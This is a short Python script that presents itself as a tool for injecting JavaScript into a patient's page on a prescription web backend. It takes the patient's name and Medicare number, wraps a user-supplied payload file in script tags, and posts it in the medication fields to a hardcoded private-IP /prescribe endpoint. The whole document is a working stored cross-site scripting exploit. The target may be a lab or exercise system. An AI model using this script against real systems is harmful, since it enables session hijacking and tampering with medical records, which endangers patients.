"""
This script communicates with the server backend to inject JS into a patient's
user page. To do this, you need to know:
    - First Name
    - Last Name
    - Medicare Number
"""

import requests

payload_file = open(input("Payload file: "))
payload = ""
for line in payload_file:
    payload += line

first_name = input("First name: ")
last_name = input("Last name: ")
medicare = input("Medicare number: ")

# send request to backend
xss = "<script>{payload}</script>".format(payload=payload)
xss = input("Filler precription: ") + xss

data = {
    'first_name': first_name,
    'last_name': last_name,
    'medicare': medicare,
    'num_repeats': '5',
    'repeats': '5',
    'type_medication': xss,
    'medication': xss
}

r = requests.post("http://10.66.28.202:8231/prescribe", data)
if r.text == "Prescription sent! <a href='javascript:history.back()''>Go back</a>":
    print("Success!")
else:
    print("Error:", r.status_code, r.text)


